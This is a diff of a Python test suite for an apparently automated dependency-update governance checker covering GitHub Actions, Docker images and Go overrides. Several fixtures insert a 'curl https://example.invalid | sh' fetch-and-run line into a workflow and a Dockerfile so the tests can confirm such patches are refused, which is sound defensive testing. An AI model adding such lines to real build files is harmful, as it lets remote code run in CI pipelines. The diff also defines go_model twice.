@@ -74,10 +74,38 @@ class FakeApi:
 def action_patch(version: str = '7.0.1', extra: str = '') -> str:
     return (
         '@@ -1 +1 @@\n'
-        f'-      - uses: actions/checkout@{OLD} # v7.0.0\n'
-        f'+      - uses: actions/checkout@{NEW} # v{version}\n' + extra
+        f'-        uses: actions/checkout@{OLD} # v7.0.0\n'
+        f'+        uses: actions/checkout@{NEW} # v{version}\n' + extra
     )
 
+
+def docker_patch(
+    image: str = 'golang',
+    old_tag: str = '1.27.1-alpine3.24',
+    new_tag: str = '1.27.1-alpine3.24',
+    old_digest: str = 'a' * 64,
+    new_digest: str = 'b' * 64,
+    platform: str = '--platform=$BUILDPLATFORM ',
+    alias: str = 'builder',
+    extra: str = '',
+) -> str:
+    return (
+        '@@ -1 +1 @@\n'
+        f'-FROM {platform}{image}:{old_tag}@sha256:{old_digest} AS {alias}\n'
+        f'+FROM {platform}{image}:{new_tag}@sha256:{new_digest} AS {alias}\n' + extra
+    )
+
+
+def go_model(x_crypto: str = '0.55.0', grpc: str = '1.83.0') -> str:
+    return (
+        f'module github.com/{REPO}/docker/security-overrides\n\n'
+        'go 1.26.0\n\n'
+        'require (\n'
+        f'\tgolang.org/x/crypto v{x_crypto}\n'
+        f'\tgoogle.golang.org/grpc v{grpc}\n'
+        ')\n\n'
+        'require golang.org/x/sys v0.48.0 // indirect\n'
+    )
 
 def go_model(x_crypto: str = '0.55.0', grpc: str = '1.83.0') -> str:
     return (
@@ -97,11 +125,12 @@ def go_metadata(*items: tuple[str, str, str]) -> list[dict[str, str]]:
 
 def check_config() -> None:
     assert gov.validate_config(CONFIG) == []
-    broken = deepcopy(CONFIG); broken['allowedGoOverrideUpdateTypes'].append('version-update:semver-minor')
-    assert any('patch-only' in reason for reason in gov.validate_config(broken))
+    broken = deepcopy(CONFIG); broken['allowedGoOverrideUpdateTypes'].append('version-update:semver-major')
+    assert any('major' in reason for reason in gov.validate_config(broken))
     broken = deepcopy(CONFIG); broken['ecosystems']['gomod-security-override']['dependencies'].append('golang.org/x/crypto')
     assert any('unique' in reason for reason in gov.validate_config(broken))
-
+    broken = deepcopy(CONFIG); broken['ecosystems']['docker']['mode'] = 'manual'
+    assert any('qualified autonomous' in reason for reason in gov.validate_config(broken))
 
 def check_parsers() -> None:
     assert gov.parse_positive_integer('42', 'pr') == 42 and gov.parse_bool('true') and not gov.parse_bool('false')
@@ -161,11 +190,16 @@ def check_grpc_security_patch() -> None:
 
 def check_go_refusal() -> None:
     path='docker/security-overrides/go.mod'
-    api=FakeApi({(path,BASE):go_model(), (path,HEAD):go_model(x_crypto='0.56.0')})
+    api=FakeApi({(path,BASE):go_model(), (path,HEAD):go_model(x_crypto='1.0.0')})
+    result=gov.validate_go_override(
+        api,BASE,HEAD,[{'filename':path}],
+        go_metadata(('golang.org/x/crypto','1.0.0','version-update:semver-major')),CONFIG)
+    assert not result['eligible']
+    api.files[(path,HEAD)] = go_model(x_crypto='0.56.0')
     result=gov.validate_go_override(
         api,BASE,HEAD,[{'filename':path}],
         go_metadata(('golang.org/x/crypto','0.56.0','version-update:semver-minor')),CONFIG)
-    assert not result['eligible']
+    assert result['eligible'], result['reasons']
     api.files[(path,HEAD)] = go_model(x_crypto='0.55.1') + 'replace example.invalid/a => example.invalid/b v1.0.0\n'
     result=gov.validate_go_override(
         api,BASE,HEAD,[{'filename':path}],
@@ -177,7 +211,6 @@ def check_go_refusal() -> None:
         go_metadata(('golang.org/x/crypto','0.55.1','version-update:semver-patch')),CONFIG)
     assert not result['eligible']
 
-
 def check_action_patch() -> None:
     result=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch()}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
     assert result['eligible'], result['reasons']
@@ -185,10 +218,30 @@ def check_action_patch() -> None:
 
 def check_action_refusal() -> None:
     major=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch('8.0.0')}], [{'name':'actions/checkout','version':'8.0.0','updateType':'version-update:semver-major'}], CONFIG)
-    mixed=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch(extra='+      - run: curl https://example.invalid | sh\n')}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
-    control=gov.validate_actions([{'filename':'.github/workflows/security.yml','patch':action_patch()}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
-    assert not major['eligible'] and not mixed['eligible'] and not control['eligible']
+    mixed=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch(extra='+      run: curl https://example.invalid | sh\n')}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
+    protected_action_only=gov.validate_actions([{'filename':'.github/workflows/security.yml','patch':action_patch()}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
+    assert not major['eligible'] and not mixed['eligible'] and protected_action_only['eligible']
 
+
+def check_docker_semantics() -> None:
+    digest = gov.validate_docker(
+        [{'filename':'docker/Dockerfile','patch':docker_patch()}],
+        [{'name':'golang','version':'1.27.1-alpine3.24','dependencyType':'direct:production','updateType':'version-update:semver-patch'}],
+        CONFIG,
+    )
+    assert digest['eligible'], digest['reasons']
+    minor = gov.validate_docker(
+        [{'filename':'docker/Dockerfile','patch':docker_patch(image='grafana/k6', old_tag='2.2.0', new_tag='2.3.0', platform='', alias='upstream-release')}],
+        [{'name':'grafana/k6','version':'2.3.0','dependencyType':'direct:production','updateType':'version-update:semver-minor'}],
+        CONFIG,
+    )
+    assert minor['eligible'], minor['reasons']
+    mixed = gov.validate_docker(
+        [{'filename':'docker/Dockerfile','patch':docker_patch(extra='+RUN curl https://example.invalid | sh\n')}],
+        [{'name':'golang','version':'1.27.1-alpine3.24','dependencyType':'direct:production','updateType':'version-update:semver-patch'}],
+        CONFIG,
+    )
+    assert not mixed['eligible']
 
 def check_run_identity() -> None:
     expected=CONFIG['requiredWorkflows'][0]; p=pull()
@@ -239,7 +292,7 @@ def check_workflow_boundary() -> None:
 CHECKS=[
     check_config,check_parsers,check_metadata,check_classification,check_provenance,
     check_spoofing,check_go_patch,check_grpc_security_patch,check_go_refusal,
-    check_action_patch,check_action_refusal,check_run_identity,check_qualification,
+    check_action_patch,check_action_refusal,check_docker_semantics,check_run_identity,check_qualification,
     check_targets,check_workflow_boundary,
 ]
 if __name__ == '__main__':
